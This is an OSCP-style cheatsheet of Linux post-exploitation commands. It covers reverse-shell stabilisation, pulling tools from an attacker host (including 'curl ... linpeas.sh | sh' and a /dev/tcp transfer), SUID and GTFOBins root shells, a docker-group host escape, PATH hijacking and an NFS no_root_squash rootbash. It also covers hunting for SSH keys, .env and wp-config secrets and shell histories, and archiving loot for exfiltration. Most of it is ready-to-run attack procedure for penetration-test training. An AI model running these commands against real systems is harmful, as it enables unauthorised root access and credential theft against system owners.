# Linux Commands and Operations - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Linux Privilege Escalation: [[03-Linux-PrivEsc|03 - Linux Privilege Escalation]]
> - File Transfer Methodology: [[07-File-Transfer|07 - File Transfer Methodology]]
> - Shells and Payloads: [[08-Shells-Payloads|08 - Shells and Payloads]] | [[🐢 reverse-shells]]
> - Pivoting and Tunneling: [[06-Pivoting-Directory|06 - Pivoting Methodology]] | [[🔀 ligolo-chisel]]

---

## Navigation Triage Matrix

| Operational Goal | Technique / Category | Quick Link |
|---|---|---|
| Upgrade raw netcat shell to fully interactive TTY | Shell Stabilization | [[#1. Shell Stabilization Protocols]] |
| Query DNS, zone transfers, and network identity | Network and DNS Enumeration | [[#2. Network and DNS Enumeration]] |
| Transfer files and payloads to Linux target | File Download Methods | [[#3. File Download Methods on Linux]] |
| Pack, compress, and extract directories | Archive and Compression | [[#4. Archiving and Compression]] |
| Systematically audit privilege escalation vectors | Privilege Escalation Triage | [[#5. Privilege Escalation Triage]] |
| Hunt for passwords, keys, and database files | Credential Hunting | [[#6. Credential Hunting and Sensitive Files]] |
| Audit listening ports, routes, and background jobs | Network and Process Analysis | [[#7. Network and Process Analysis]] |
| Enumerate installed packages and running daemons | Software and Services | [[#8. Software and Service Enumeration]] |
| Exploit NFS shares with no_root_squash | NFS Exploitation | [[#9. NFS no_root_squash Exploitation]] |
| Parse outputs, extract columns, and filter streams | Text Processing | [[#10. Text and Stream Processing (awk, sed, grep)]] |
| Systematic terminal privilege escalation checklist | Quick Reference Checklist | [[#11. Quick Reference Linux PrivEsc Checklist]] |

---

## 1. Shell Stabilization Protocols

Immediately stabilize incoming raw reverse shells (Netcat, socat) to enable tab completion, arrow key navigation, job control (`Ctrl + C`), and clear text formatting:

### Method 1: Python PTY Spawn (Standard Procedure)
1. In the active reverse shell, spawn a pseudo-terminal:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Fallback for Python 2:
   python -c 'import pty; pty.spawn("/bin/bash")'
   # Fallback for POSIX sh:
   python3 -c 'import pty; pty.spawn("/bin/sh")'
   ```
2. Set terminal environment variables:
   ```bash
   export TERM=xterm-256color
   export SHELL=bash
   ```
3. Background the reverse shell process:
   Press `Ctrl + Z`.
4. In your local Kali terminal, inspect your terminal geometry:
   ```bash
   stty -a | grep -o 'rows [0-9]*; columns [0-9]*'
   ```
5. Pass raw terminal control characters to the foreground:
   ```bash
   stty raw -echo; fg
   ```
   *(Press `Enter` twice to refresh prompt)*
6. Synchronize terminal window dimensions in the remote shell:
   ```bash
   stty rows [ROWS] cols [COLUMNS]
   ```

### Method 2: Script Command (When Python is Absent)
```bash
/usr/bin/script -qc /bin/bash /dev/null
# Then follow steps 2-5 above (Ctrl+Z -> stty raw -echo; fg)
```

### Method 3: Emergency Terminal Reset
If terminal input becomes corrupted or invisible:
```bash
reset
# Or blind type:
stty sane
```

---

## 2. Network and DNS Enumeration

### DNS Records and Zone Transfers
```bash
# Query all DNS records for a domain
dig [DOMAIN] ANY

# Attempt DNS Zone Transfer (AXFR)
dig axfr @[DNS_SERVER_IP] [DOMAIN]

# Host lookup
host -t A [DOMAIN] [DNS_SERVER_IP]
host -t MX [DOMAIN] [DNS_SERVER_IP]

# Reverse IP lookup
nslookup [TARGET_IP] [DNS_SERVER_IP]
```

### Network Route and ARP Inspection
```bash
# Display routing table
ip route
netstat -rn

# Inspect neighboring hosts via ARP cache
ip neigh
arp -a
cat /proc/net/arp
```

---

## 3. File Download Methods on Linux

### Wget and cURL
```bash
# Standard wget download to writable directory
wget http://[KALI_IP]/linpeas.sh -O /tmp/linpeas.sh

# Standard curl download
curl -s http://[KALI_IP]/linpeas.sh -o /tmp/linpeas.sh

# In-memory execution without touching disk
curl -s http://[KALI_IP]/linpeas.sh | sh
```

### Python HTTP Download
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://[KALI_IP]/payload", "/tmp/payload")'
```

### Native Bash TCP Socket Transfer
When standard utilities are completely absent from the target environment:
```bash
# On Kali:
nc -lvnp 80 < payload.bin

# On Target:
cat < /dev/tcp/[KALI_IP]/80 > /tmp/payload.bin
```

### Base64 String Transfer
Encode small binaries on Kali and decode directly on the target:
```bash
# On Kali:
base64 -w 0 binary > binary.b64

# On Target:
echo "[BASE64_STRING]" | base64 -d > /tmp/binary && chmod +x /tmp/binary
```

---

## 4. Archiving and Compression

### Tar Archives
```bash
# Create compressed tar.gz archive of an entire directory (exfiltration)
tar -czvf /tmp/loot.tar.gz /var/www/html/

# Extract tar.gz archive
tar -xzvf loot.tar.gz -C /tmp/

# Extract tar.bz2 archive
tar -xjvf archive.tar.bz2
```

### Zip Archives
```bash
# Create password-protected ZIP archive
zip -e -r loot.zip /path/to/loot

# Unzip archive into target directory
unzip loot.zip -d /tmp/extracted/
```

---

## 5. Privilege Escalation Triage

Execute these triage commands immediately upon establishing a stable shell:

### Identity and Kernel Environment
```bash
id                          # Current UID, GID, group memberships
whoami
hostname
uname -a                    # Kernel version and architecture
cat /etc/os-release         # Linux distribution name and release
```

### Sudo Permissions (Immediate First Check)
```bash
sudo -l
```
*If binaries are listed with `NOPASSWD:`, immediately check [GTFOBins](https://gtfobins.github.io/) for privilege escalation techniques.*

### SUID and SGID Binaries
```bash
# Locate all SUID binaries on filesystem
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null

# Locate all SGID binaries
find / -perm -2000 -type f -exec ls -la {} + 2>/dev/null
```

#### High-Yield GTFOBins SUID Exploits
```bash
# SUID /usr/bin/find
find . -exec /bin/sh -p \; -quit

# SUID /bin/bash
/bin/bash -p

# SUID python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID env
env /bin/sh -p
```

### Linux POSIX Capabilities
```bash
getcap -r / 2>/dev/null
```
*Critical capabilities: `cap_setuid+ep` (allows setting UID to 0), `cap_dac_override+ep` (bypasses read/write permissions).*

### Scheduled Tasks (Cron Jobs and Systemd Timers)
```bash
# System-wide crontab files
cat /etc/crontab
ls -la /etc/cron*

# Current user scheduled jobs
crontab -l

# Active systemd timers
systemctl list-timers --all
```

### Globally Writable Directories and Files
```bash
# Writable directories (good staging locations)
find / -writable -type d 2>/dev/null

# Writable configuration files
find /etc -writable -type f 2>/dev/null
```

### Docker Socket and Group Escalation
If `id` reveals membership in the `docker` group:
```bash
# Mount host filesystem root into Alpine container and chroot to host root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### PATH Hijacking
```bash
echo $PATH
# If a privileged script executes a relative binary (e.g., 'backup' instead of '/usr/bin/backup')
# and a writable directory precedes standard system paths in $PATH:
echo '/bin/bash -p' > /tmp/backup && chmod +x /tmp/backup
export PATH=/tmp:$PATH
```

---

## 6. Credential Hunting and Sensitive Files

### Grepping for Passwords Across Webroots
```bash
grep -rnw '/var/www' -e 'password' 2>/dev/null
grep -rnw '/var/www' -e 'db_pass' 2>/dev/null
grep -rnw '/opt' -e 'password' 2>/dev/null
grep -ri 'password' /etc/ --include="*.conf" 2>/dev/null
```

### Standard Web Application Configurations
```bash
cat /var/www/html/wp-config.php 2>/dev/null         # WordPress credentials
cat /var/www/html/config.php 2>/dev/null             # Generic PHP frameworks
cat /var/www/html/configuration.php 2>/dev/null      # Joomla
cat /var/www/html/.env 2>/dev/null                   # Laravel / Node.js
cat /etc/apache2/sites-available/*.conf 2>/dev/null  # Apache virtual hosts
cat /etc/nginx/sites-available/* 2>/dev/null         # Nginx server blocks
```

### Shell History and Sensitive Artifacts
```bash
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

### SSH Private Keys
```bash
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
cat /etc/ssh/sshd_config 2>/dev/null
```

### Database and Password Vault Files
```bash
# Search for SQLite database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Search for KeePass database files
find / -name "*.kdbx" 2>/dev/null
```

---

## 7. Network and Process Analysis

### Listening Ports and Active Connections
```bash
# Display listening TCP and UDP sockets with process names
ss -tulpn
netstat -tulnp 2>/dev/null

# Inspect open network sockets via lsof
lsof -i -P -n
lsof -i :80
```

### Process Auditing and Live Monitoring
```bash
# Full process listing
ps aux
ps aux | grep root

# Real-time top CPU consumers
watch -n 1 'ps aux --sort=-%cpu | head -20'
```

### pspy (Process Snooping Without Root)
Snoops process execution in real time without requiring administrative privileges:
```bash
# Download and execute pspy64 on target
wget http://[KALI_IP]/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
```
*Monitors for transient cron jobs, shell scripts, and background command parameters.*

---

## 8. Software and Service Enumeration

### Package Managers
```bash
# Debian / Ubuntu installed packages
dpkg -l
dpkg -l | grep -i -E "sudo|pkexec|exim|apache|mysql"

# Red Hat / CentOS installed packages
rpm -qa
```

### Compilers and Installed Binaries
```bash
which gcc g++ python python3 perl ruby nc ncat netcat socat curl wget 2>/dev/null
```

### System Services
```bash
# List all actively running systemd services
systemctl list-units --type=service --state=running
```

---

## 9. NFS no_root_squash Exploitation

When `/etc/exports` exposes an NFS share with the `no_root_squash` configuration directive:

### 1. Identify Exported Shares
```bash
# On target machine:
cat /etc/exports

# Or from Kali machine:
showmount -e [TARGET_IP]
```

### 2. Mount Share on Kali and Create SUID Payload
```bash
# Create local mount point on Kali
mkdir /tmp/nfs_mount
sudo mount -t nfs [TARGET_IP]:/shared_dir /tmp/nfs_mount

# Copy system bash binary into the mounted share
cp /bin/bash /tmp/nfs_mount/rootbash

# Grant root ownership and set SUID bit from Kali root
sudo chown root:root /tmp/nfs_mount/rootbash
sudo chmod +s /tmp/nfs_mount/rootbash
```

### 3. Execute on Target Host
```bash
# On target machine:
/shared_dir/rootbash -p
# Immediate root privileges acquired: whoami -> root
```

---

## 10. Text and Stream Processing (awk, sed, grep)

### awk Operations
```bash
# Extract second whitespace-delimited column
cat data.txt | awk '{print $2}'

# Extract specific delimiter fields (e.g., username from /etc/passwd)
awk -F: '{print $1}' /etc/passwd

# Filter rows based on pattern match
awk '/Up/{print $2}' scan.gnmap
```

### sed Stream Editor
```bash
# Replace pattern occurrences globally
sed 's/search_term/replace_term/g' file.txt

# Delete lines matching pattern
sed -i '/404 Not Found/d' results.txt

# Delete lines containing fewer than 8 characters
sed -i '/^.\{1,7\}$/d' wordlist.txt
```

### Stream Pipeline Utilities (cut, sort, uniq, xargs)
```bash
# Extract columns by delimiter
cut -d':' -f1,3 /etc/passwd

# Sort and deduplicate in place
sort -u raw_list.txt -o sorted_unique.txt

# Pass input stream to multi-threaded command execution
cat hosts.txt | xargs -I {} -P 10 ping -c 1 {}
```

---

## 11. Quick Reference Linux PrivEsc Checklist

```text
☐ sudo -l                            --> Verify NOPASSWD binaries against GTFOBins
☐ find / -perm -4000 2>/dev/null     --> SUID binaries (bash, find, cp, python)
☐ getcap -r / 2>/dev/null            --> POSIX capabilities (cap_setuid)
☐ cat /etc/crontab + ls /etc/cron*   --> Writable scripts executed by root
☐ pspy64                             --> Monitor background processes for cron jobs
☐ ss -tulpn                          --> Unexposed internal ports (127.0.0.1)
☐ cat /etc/exports                   --> NFS shares with no_root_squash
☐ grep -rn "password" /var/www       --> Web credentials and database configs
☐ cat ~/.bash_history                --> Plaintext passwords in command history
☐ ls -la /home/*/.ssh/               --> Readable id_rsa private keys
☐ id (groups)                        --> Membership in docker, lxd, disk, adm
☐ uname -a                           --> Linux kernel version (DirtyPipe, PwnKit)
```
